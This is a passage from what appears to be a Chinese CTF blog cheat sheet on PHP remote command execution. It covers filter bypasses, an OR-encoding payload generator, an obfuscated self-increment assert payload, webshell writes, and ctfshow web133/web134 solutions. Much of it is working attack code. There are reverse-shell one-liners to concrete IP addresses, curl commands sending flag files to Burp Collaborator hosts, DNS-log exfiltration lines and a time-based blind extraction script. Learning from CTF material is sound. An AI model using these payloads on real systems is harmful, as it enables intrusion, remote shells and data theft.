class="line"><span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)|<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&quot;php rce_or.php&quot;</span>)  <span class="comment"># æ²¡æœ‰å°†phpå†™å…¥ç¯å¢ƒå˜é‡éœ€æ‰‹åŠ¨è¿è¡Œ</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">    s1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    s2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&quot;or.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t = f.readline()</span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>] == i:</span><br><span class="line">                <span class="comment"># print(i)</span></span><br><span class="line">                s1 += t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                s2 += t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output = <span class="string">&quot;(\&quot;&quot;</span> + s1 + <span class="string">&quot;\&quot;|\&quot;&quot;</span> + s2 + <span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (output)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    param = action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your functionï¼š&quot;</span>)) + action(<span class="built_in">input</span>(<span class="string">&quot;[+] your commandï¼š&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(param)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="2-5è‡ªå¢ç»•è¿‡">2.5è‡ªå¢ç»•è¿‡</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span>æµ‹è¯•å‘ç°<span class="number">7.0</span>.<span class="number">12</span>ä»¥ä¸Šç‰ˆæœ¬ä¸å¯ä½¿ç”¨</span><br><span class="line"><span class="regexp">//</span>ä½¿ç”¨æ—¶éœ€è¦urlç¼–ç ä¸‹</span><br><span class="line"><span class="variable">$_</span>=[];<span class="variable">$_</span>=@<span class="string">&quot;$_&quot;</span>;<span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>];<span class="variable">$___</span>=<span class="variable">$_</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$_</span>=$<span class="variable">$____</span>;<span class="variable">$___</span>(<span class="variable">$_</span>[_]);</span><br><span class="line">å›ºå®šæ ¼å¼ æ„é€ å‡ºæ¥çš„ assert(<span class="variable">$_POST</span>[_]);</span><br><span class="line">ç„¶åpostä¼ å…¥   _=phpinfo();</span><br></pre></td></tr></table></figure><h4 id="2-6ä¸´æ—¶æ–‡ä»¶æ‰§è¡Œ">2.6ä¸´æ—¶æ–‡ä»¶æ‰§è¡Œ</h4><p>ä½¿ç”¨äº$ä¹Ÿè¢«è¿‡æ»¤äº†çš„æƒ…å†µ</p><p>åˆ©ç”¨ç‚¹æ‰§è¡Œä¸´æ—¶æ–‡ä»¶ï¼Œç”¨?åŒ¹é…ä¸´æ—¶æ–‡ä»¶ï¼Œæ­£åˆ™è¡¨è¾¾å¼çš„å†…å®¹å¯ä»¥éšä¾¿æ›¿æ¢ï¼Œå¦‚æœæœ‰ç»•è¿‡çš„è¯</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">. /<span class="string">??</span><span class="string">?/</span><span class="string">??</span><span class="string">??</span><span class="string">??</span><span class="string">??</span>[@-[]</span><br></pre></td></tr></table></figure><p>æ‰§è¡ŒåŒ…</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /?shell<span class="operator">=</span>?&gt;&lt;?<span class="operator">=</span>`.+/<span class="variable">%3</span>f<span class="variable">%3</span>f<span class="variable">%3</span>f/<span class="variable">%3</span>f<span class="variable">%3</span>f<span class="variable">%3</span>f<span class="variable">%3</span>f<span class="variable">%3</span>f<span class="variable">%3</span>f<span class="variable">%3</span>f<span class="variable">%3</span>f[<span class="variable">%40</span>-[]`<span class="variable">%3</span>b?&gt; HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span>.<span class="number">43.210</span>:<span class="number">8080</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span><span class="comment">; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0</span></span><br><span class="line">Accept: text/html<span class="punctuation">,</span>application/xhtml+xml<span class="punctuation">,</span>application/xml<span class="comment">;q=0.9,image/webp,*/*;q=0.8</span></span><br><span class="line">Accept-Language: zh-CN<span class="punctuation">,</span>zh<span class="comment">;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line">Content-Type:multipart/form-data<span class="comment">;boundary=--------123</span></span><br><span class="line">Accept-Encoding: gzip<span class="punctuation">,</span> deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Content-Length: <span class="number">109</span></span><br><span class="line"></span><br><span class="line">---------<span class="number">-123</span></span><br><span class="line">Content-Disposition:form-data<span class="comment">;name=&quot;file&quot;;filename=&quot;1.txt&quot;</span></span><br><span class="line"></span><br><span class="line">#!/bin/sh</span><br><span class="line">ls /</span><br><span class="line">---------<span class="number">-123</span>--</span><br></pre></td></tr></table></figure><h3 id="3-å‘½ä»¤è¡Œå†™shell">3.å‘½ä»¤è¡Œå†™shell</h3><p>å‰æï¼šå¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">echo &#x27;PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8%2B&#x27; | base64 -d &gt; 123.php</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">echo &#x27;</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(\<span class="variable">$_GET</span>[<span class="number">1</span>]);<span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><span class="language-xml">&#x27; &gt; /var/www/html/basic/web/2.php</span></span><br></pre></td></tr></table></figure><h3 id="4-æ— å›æ˜¾RCE">4.æ— å›æ˜¾RCE</h3><h4 id="4-1åå¼¹shell">4.1åå¼¹shell</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nc 150.158.24.228 150 -e /bin/sh</span><br><span class="line">bash -c \&quot;bash -i &gt;&amp; /dev/tcp/150.158.24.228/150 0&gt;&amp;1\&quot;</span><br><span class="line"></span><br><span class="line">nc 110.41.17.183 150 -e /bin/sh</span><br><span class="line">bash -c \&quot;bash -i &gt;&amp; /dev/tcp/110.41.17.183/250 0&gt;&amp;1\&quot;</span><br></pre></td></tr></table></figure><h4 id="4-2ç›´æ¥å†™å…¥">4.2ç›´æ¥å†™å…¥</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">åˆ©ç”¨<span class="built_in">cp</span>å‘½ä»¤ï¼š<span class="built_in">cp</span> flag.php <span class="number">1</span>.txt</span><br><span class="line"></span><br><span class="line">åˆ©ç”¨<span class="built_in">mv</span>å‘½ä»¤ï¼š<span class="built_in">mv</span> flag.php <span class="number">1</span>.txt</span><br><span class="line"></span><br><span class="line">åˆ©ç”¨&gt;è¾“å‡ºç»“æœåˆ°æ–‡ä»¶ï¼š<span class="built_in">ls</span> &gt; <span class="number">1</span>.txt</span><br><span class="line"></span><br><span class="line">åˆ©ç”¨<span class="built_in">wget</span>ä¸‹è½½ï¼š<span class="built_in">wget</span> http://ip/shell.txt &gt; shell.phpæˆ–è€…<span class="built_in">wget</span> http://ip/shell.txt <span class="literal">-O</span> shell.php</span><br></pre></td></tr></table></figure><h4 id="4-3burp-Collaborator-Client">4.3burp(Collaborator Client)</h4><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">åˆ©ç”¨bpçš„Collaborator <span class="built_in">Client</span>æ¨¡å—è¿›è¡Œæ“ä½œ</span><br><span class="line"></span><br><span class="line">curl -X POST -F xx=@/flag http:<span class="comment">//qvpx2nspeuaw3w0lqulk72nyspysmh.oastify.com</span></span><br></pre></td></tr></table></figure><h4 id="4-4æ•°æ®å¤–å¸¦dnslog">4.4æ•°æ®å¤–å¸¦dnslog</h4><p>æ¨èä¿©ç½‘å€ï¼š</p><p>1.<a href="http://dnslog.cn">http://dnslog.cn</a></p><p>2.<a href="http://ceye.io/">http://ceye.io/</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">å•è¡Œä¼ è¾“ï¼š</span><br><span class="line">ping `<span class="built_in">whoami</span>`.dnsåœ°å€</span><br><span class="line">curl http://dnsåœ°å€/`<span class="built_in">whoami</span>`</span><br><span class="line"></span><br><span class="line">å¤šè¡Œä¼ è¾“ï¼š(å¤–å¸¦åªä¼šæ˜¾ç¤ºç¬¬ä¸€è¡Œçš„æ•°æ®)</span><br><span class="line">curl http://dnsåœ°å€/`<span class="built_in">whoami</span> | <span class="built_in">base64</span>`</span><br><span class="line">curl http://dnsåœ°å€/`<span class="built_in">whoami</span> | sed -n <span class="string">&#x27;2p&#x27;</span>`</span><br></pre></td></tr></table></figure><h4 id="4-5ç›²æ³¨">4.5ç›²æ³¨</h4><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import <span class="built_in">string</span></span><br><span class="line">import <span class="built_in">time</span></span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://localhost.test.php/?c=&#x27;</span></span><br><span class="line">dic=<span class="built_in">string</span>.printable[:<span class="number">-6</span>]</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    judge=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        now=f<span class="string">&#x27;&#123;url&#125;a=$(cat /flag | head -1 | cut -b &#123;i&#125;);if [ $a = &#123;j&#125; ];then sleep 2;fi&#x27;</span></span><br><span class="line">        start=<span class="built_in">time</span>.<span class="built_in">time</span>()</span><br><span class="line">        r=requests.get(now)</span><br><span class="line">        <span class="keyword">end</span>=<span class="built_in">time</span>.<span class="built_in">time</span>()</span><br><span class="line">        <span class="keyword">if</span> int(<span class="keyword">end</span>)-int(start) &gt;<span class="number">1</span>:</span><br><span class="line">            judge=<span class="number">1</span></span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> judge==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>å‘½ä»¤è§£æ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> [ `<span class="built_in">cat</span> /flag | awk NR==1 | <span class="built_in">cut</span> -c %s` == %s ];<span class="keyword">then</span> <span class="built_in">sleep</span> 2;<span class="keyword">fi</span></span><br></pre></td></tr></table></figure><h3 id="5-ç»•è¿‡é•¿åº¦é™åˆ¶">5.ç»•è¿‡é•¿åº¦é™åˆ¶</h3><h4 id="5-1substr-å‡½æ•°æˆªå–">5.1substr()å‡½æ•°æˆªå–</h4><h5 id="5-1-1-web133">5.1.1 web133</h5><p><strong>æºä»£ç </strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;6ä¸ªå­—æ¯éƒ½è¿˜ä¸å¤Ÿå‘€?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><strong>åˆ†æ</strong></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">getä¼ å‚   F=<span class="string">`$F `</span>; <span class="keyword">sleep</span> <span class="number">3</span></span><br><span class="line">ç»è¿‡<span class="keyword">substr</span>($F,<span class="number">0</span>,<span class="number">6</span>)æˆªå–å å¾—åˆ°  <span class="string">`$F `</span>;</span><br><span class="line">ä¹Ÿå°±æ˜¯ä¼šæ‰§è¡Œ <span class="keyword">eval</span>(<span class="string">&quot;`$F `;&quot;</span>);</span><br><span class="line">æˆ‘ä»¬æŠŠåŸæ¥çš„$Få¸¦è¿›å»</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;``$F `;sleep 3`&quot;</span>);</span><br><span class="line">ä¹Ÿå°±æ˜¯è¯´æœ€ç»ˆä¼šæ‰§è¡Œ  <span class="string">` `</span>$F <span class="string">`;sleep 3 `</span> == shell_exec(<span class="string">&quot;`$F `; sleep 3&quot;</span>);</span><br><span class="line">å‰é¢çš„å‘½ä»¤æˆ‘ä»¬ä¸éœ€è¦ç®¡ï¼Œä½†æ˜¯åé¢çš„å‘½ä»¤æˆ‘ä»¬å¯ä»¥è‡ªç”±æ§åˆ¶ã€‚</span><br><span class="line">è¿™æ ·å°±åœ¨æœåŠ¡å™¨ä¸ŠæˆåŠŸæ‰§è¡Œäº† <span class="keyword">sleep</span> <span class="number">3</span></span><br><span class="line">æ‰€ä»¥ æœ€åå°±æ˜¯ä¸€é“æ— å›æ˜¾çš„RCEé¢˜ç›®äº†</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload: ?F=`<span class="variable">$F</span>`; curl -X POST -F xx=@flag.php http:<span class="regexp">//</span>juhspnhonkrsc5p0qayb5lgbi2osch.burpcollaborator.net</span><br><span class="line"><span class="regexp">//</span>åé¢çš„è¿™ä¸ªæ˜¯ç”¨burpsuiteç”Ÿæˆçš„</span><br></pre></td></tr></table></figure><h5 id="5-1-2-web134">5.1.2 web134</h5><p><strong>æºä»£ç </strong></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error<span class="constructor">_reporting(0)</span>;</span><br><span class="line">highlight<span class="constructor">_file(<span class="params">__FILE__</span>)</span>;</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>($F = @$_GET<span class="literal">[&#x27;F&#x27;]</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg<span class="constructor">_match(&#x27;<span class="operator">/</span><span class="params">system</span>|<span class="params">nc</span>|<span class="params">wget</span>|<span class="params">exec</span>|<span class="params">passthru</span>|<span class="params">bash</span>|<span class="params">sh</span>|<span class="params">netcat</span>|<span class="params">curl</span>|<span class="params">cat</span>|<span class="params">grep</span>|<span class="params">tac</span>|<span class="params">more</span>|<span class="params">od</span>|<span class="params">sort</span>|<span class="params">tail</span>|<span class="params">less</span>|<span class="params">base64</span>|<span class="params">rev</span>|<span class="params">cut</span>|<span class="params">od</span>|<span class="params">strings</span>|<span class="params">tailf</span>|<span class="params">head</span><span class="operator">/</span><span class="params">i</span>&#x27;, $F)</span>)&#123;</span><br><span class="line">        eval(substr($F,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        die(<span class="string">&quot;å¸ˆå‚…ä»¬å±…ç„¶ç ´è§£äº†å‰é¢çš„ï¼Œé‚£å°±æ¥ä¸€ä¸ªåŠ å¼ºç‰ˆå§&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">payload:</span>F=`$F `; nl f*&gt;<span class="number">1</span>.txt</span><br><span class="line"><span class="title">payload:</span>F=`$F `; cp f* <span class="number">2</span>.txt</span><br><span class="line"></span><br><span class="line">//æ³¨æ„ï¼Œè¿™é‡Œçš„<span class="comment">;å·å’Œåé¢å‘½ä»¤ä¸­é—´å¿…é¡»æœ‰ä¸ªç©ºæ ¼ï¼Œæ²¡æœ‰æ‰§è¡Œä¸äº†ï¼Œä¸çŸ¥é“ä¸ºå•¥</span></span><br></pre></td></tr></table></figure><h4 id="5-2å•çº¯é•¿åº¦é™åˆ¶">5.2å•çº¯é•¿åº¦é™åˆ¶</h4><h5 id="5-2-1-é€šè¿‡-æ¥åˆ›å»ºæ–‡ä»¶">5.2.1 é€šè¿‡&gt;æ¥åˆ›å»ºæ–‡ä»¶</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;flag.txt    <span class="regexp">//</span>åˆ›å»ºæ–‡ä»¶flag.txt</span><br></pre></td></tr></table></figure><h5 id="5-2-2-é€šè¿‡-å°†å‘½ä»¤ç»“æœå­˜å…¥æ–‡ä»¶ä¸­">5.2.2 é€šè¿‡&gt;å°†å‘½ä»¤ç»“æœå­˜å…¥æ–‡ä»¶ä¸­</h5><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">&quot;PD9waHAgZXZhbCgkX1BPU1RbY2h1MF0pOyA/Pg==&quot;</span> <span class="string">| base64 -d &gt; flag.php</span></span><br><span class="line"><span class="comment">//å°†é©¬å†™å…¥flag.phpï¼Œå†™shellå¿…é¡»å¾—ç”¨è¿™ä¸ª</span></span><br></pre></td></tr></table></figure><h5 id="5-2-3-ç¬¦å·çš„ä½œç”¨æ˜¯å°†å­—ç¬¦ä¸²æ·»åŠ åˆ°æ–‡ä»¶å†…å®¹æœ«å°¾ï¼Œä¸ä¼šè¦†ç›–åŸå†…å®¹">5.2.3 &gt;&gt;ç¬¦å·çš„ä½œç”¨æ˜¯å°†å­—ç¬¦ä¸²æ·»åŠ åˆ°æ–‡ä»¶å†…å®¹æœ«å°¾ï¼Œä¸ä¼šè¦†ç›–åŸå†…å®¹</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;hello hacker&quot;</span> &gt;&gt; flag.txt</span><br></pre></td></tr></table></figure><h3 id="6-å‘½ä»¤ç»•è¿‡">6.å‘½ä»¤ç»•è¿‡</h3><h4 id="6-1ç©ºæ ¼">6.1ç©ºæ ¼</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$IFS</span>              </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;<span class="built_in">cat</span>,flag.php&#125;                      